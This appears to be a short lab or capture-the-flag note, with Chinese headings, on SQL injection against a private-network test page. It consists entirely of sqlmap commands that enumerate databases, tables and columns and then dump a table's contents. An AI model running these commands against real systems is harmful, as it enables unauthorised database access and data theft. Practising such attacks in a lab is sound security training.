http://172.20.2.4/100510015-1f0b4914/index.php?id=1

sql注入

数据库

sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 --dbs

表

sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 --tables

列

sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 -T horse --columns

名

sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 -T horse -C where/id/number --dump
